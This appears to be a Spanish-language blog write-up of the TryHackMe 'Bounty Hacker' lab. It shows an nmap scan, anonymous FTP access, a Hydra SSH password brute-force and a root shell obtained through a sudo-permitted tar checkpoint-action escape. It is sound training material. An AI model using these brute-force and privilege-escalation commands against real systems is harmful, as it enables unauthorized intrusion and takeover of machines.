---
layout: article
title: BountyHunter
tags: TryHackMe
article_header:
  type: cover
  image:
    src: /thumbnail.jpg
---

Esta es una maquina de TryHackMe
<!--more-->
---


En la primera respuesta nos pide saber quien ha creado el fichero task, para ello hacemos un escaneo con nmap
~~~
sudo nmap 10.10.69.226
~~~
~~~
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 17:32 CET
Nmap scan report for 10.10.69.226
Host is up (0.069s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (reset)
PORT   STATE SERVICE
21/tcp open  ftp
22/tcp open  ssh
80/tcp open  http
~~~
Y despues dejamos otro escaneo en segundo plano para que nos de mas información
~~~
$ nmap -Pn -n -T5 --script ftp-anon 10.10.69.226
~~~
~~~
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-10 17:46 CET
Nmap scan report for 10.10.69.226
Host is up (0.067s latency).
Not shown: 967 filtered tcp ports (no-response), 30 closed tcp ports (conn-refused)
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_Can't get directory listing: TIMEOUT
22/tcp open  ssh
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 34.97 seconds
~~~

Esto saca los servicios y dice que el ftp tiene login anonimo, por lo que accedemos de la siguiente forma
~~~
ftp 10.10.69.226


Connected to 10.10.69.226.
220 (vsFTPd 3.0.3)
Name (10.10.69.226:kali): ftp
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> 
~~~

Una vez ya estoy en el hago un ls
~~~
ftp> ls
-rw-rw-r--    1 ftp      ftp           418 Jun 07  2020 locks.txt
-rw-rw-r--    1 ftp      ftp            68 Jun 07  2020 task.txt
226 Directory send OK.
~~~
Y como el archivo que queremos es el task.txt, lo sacamos con el comando get
~~~
ftp> get task.txt
local: task.txt remote: task.txt
200 EPRT command successful. Consider using EPSV.
150 Opening BINARY mode data connection for task.txt (68 bytes).
100% |********************************|    68      134.15 KiB/s    00:00 ETA
226 Transfer complete.
68 bytes received in 00:00 (1.00 KiB/s)
~~~

Dentro de este fichero tenemos la respuesta de la primera cuestión
~~~
cat task.txt 
1.) Protect Vicious.
2.) Plan for Red Eye pickup on the moon.

-XXX
~~~
Para la segunda respuesta, tenemos dos servicios restantes, de los cuales al hacerle un hydra al ssh con el fichero locks.txt nos da la contraseña. 
~~~
$ hydra -l XXXX -P locks.txt ssh://10.10.69.226
Hydra v9.3 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2023-01-10 17:41:33
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 16 tasks per 1 server, overall 16 tasks, 26 login tries (l:1/p:26), ~2 tries per task
[DATA] attacking ssh://10.10.69.226:22/
[22][ssh] host: 10.10.69.226   login: XXXX   password: XXXXXX
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2023-01-10 17:41:37
~~~
Una vez que tenemos la contraseña, podemos entrar en el ssh de la siguiente forma
~~~
$ ssh XXX@10.10.69.226           
The authenticity of host '10.10.69.226 (10.10.69.226)' can't be established.
ED25519 key fingerprint is SHA256:Y140oz+ukdhfyG8/c5KvqKdvm+Kl+gLSvokSys7SgPU.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.69.226' (ED25519) to the list of known hosts.
XXX@10.10.69.226's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.15.0-101-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

83 packages can be updated.
0 updates are security updates.

Last login: Sun Jun  7 22:23:41 2020 from 192.168.0.14
XXX@bountyhacker:~/Desktop$ 
~~~
Una vez ya dentro del servidor ssh podemos sacar la flag de user.txt
~~~
XXXX@bountyhacker:~/Desktop$ cat user.txt 
XXX{XXXXX}
~~~
Ahora necesitamos hacer escalada de privilegio para poder sacar root.txt, primero miramos que programas puedo utilizar con sudo -l, veo lo que podemos ejecutar como administrador 
~~~
XXXX@bountyhacker:~/Desktop$ sudo -l

[sudo] password for XXXX: 
Matching Defaults entries for lin on bountyhacker:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User XXX may run the following commands on bountyhacker:
    (root) /bin/tar
~~~
Una vez tenemos que podemos ejecutar /bin/tar buscamos en gtfobins, que comando podemos usar para escalar privilegios
~~~
XXX@bountyhacker:~/Desktop$ tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
tar: Removing leading `/' from member names
#
~~~
Despues de ejecutarlo nos volvemos root en el sistema
~~~
# whoami
root
~~~
La flag de root la encontramos en el directorio root
~~~
# cat root.txt
XXX{XXXXXXX}
~~~